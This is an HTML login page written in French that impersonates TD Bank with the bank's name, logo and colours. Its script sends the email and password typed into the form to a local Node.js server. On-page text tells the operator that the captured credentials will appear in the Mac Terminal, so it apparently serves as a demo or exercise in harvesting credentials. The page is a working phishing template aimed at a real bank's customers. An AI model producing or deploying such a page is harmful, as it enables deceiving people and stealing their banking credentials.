<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Connexion - TD Bank</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-font-smoothing: antialiased;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: linear-gradient(135deg, #006400 0%, #00A300 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .boite-login {
            background: white;
            padding: 50px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 450px;
            text-align: center;
        }

        .logo-login {
            width: 70px;
            height: 70px;
            background: #008A00;
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 28px;
            margin: 0 auto 25px;
        }

        h1 {
            color: #1d1d1f;
            margin-bottom: 8px;
            font-size: 28px;
            font-weight: 700;
        }

        .sous-titre {
            color: #86868b;
            margin-bottom: 35px;
            font-size: 16px;
        }

        .groupe-champ {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #1d1d1f;
            font-weight: 600;
            font-size: 14px;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 14px;
            border: 2px solid #e5e5e7;
            border-radius: 10px;
            font-size: 16px;
            font-family: inherit;
        }

        input[type="email"]:focus,
        input[type="password"]:focus {
            border-color: #008A00;
            outline: none;
            box-shadow: 0 0 0 4px rgba(0,138,0,0.1);
        }

        .options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
            font-size: 14px;
        }

        .souvenir {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #1d1d1f;
        }

        input[type="checkbox"] {
            width: 18px;
            height: 18px;
            accent-color: #008A00;
            cursor: pointer;
        }

        .mdp-oublie {
            color: #008A00;
            text-decoration: none;
            font-weight: 500;
        }

        .bouton-submit {
            width: 100%;
            background: #008A00;
            color: white;
            padding: 16px;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }

        .bouton-submit:hover {
            background: #006400;
            transform: scale(1.02);
        }

        .retour-accueil {
            display: block;
            margin-top: 25px;
            color: #008A00;
            text-decoration: none;
            font-weight: 500;
            font-size: 15px;
        }

        .message-succes {
            background: #f0fff4;
            color: #008A00;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: none;
            font-size: 14px;
            border: 1px solid #c6f6d5;
        }
    </style>
</head>
<body>

<div class="boite-login">
    <div class="logo-login">TD</div>
    <h1>Connexion sécurisée</h1>
    <p class="sous-titre">Les identifiants vont apparaître dans le Terminal</p>

    <div class="message-succes" id="msgSucces">
        ✅ Identifiants envoyés au serveur !<br>
        Regarde dans ton Terminal Mac !
    </div>

    <form id="formLogin">
        <div class="groupe-champ">
            <label for="email">Adresse email</label>
            <input type="email" id="email" name="email" placeholder="nom@exemple.com" required>
        </div>

        <div class="groupe-champ">
            <label for="password">Mot de passe</label>
            <input type="password" id="password" name="password" placeholder="••••••••" required>
        </div>

        <div class="options">
            <label class="souvenir">
                <input type="checkbox"> Se souvenir de moi
            </label>
            <a href="#" class="mdp-oublie">Mot de passe oublié ?</a>
        </div>

        <button type="submit" class="bouton-submit">Se connecter</button>
    </form>

    <a href="/" class="retour-accueil">← Retour à l'accueil</a>
</div>

<script>
    // JavaScript magique qui envoie au serveur
    document.getElementById('formLogin').addEventListener('submit', async function(e) {
        e.preventDefault(); // Empêche le rechargement de page
        
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        // Envoi des données au serveur Node.js
        try {
            const response = await fetch('/connexion', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
            });
            
            const data = await response.json();
            
            if(data.success) {
                document.getElementById('msgSucces').style.display = 'block';
                // Réinitialise le formulaire
                this.reset();
            }
        } catch (error) {
            alert('Erreur : Le serveur est-il démarré ?');
        }
    });
</script>

</body>
</html>
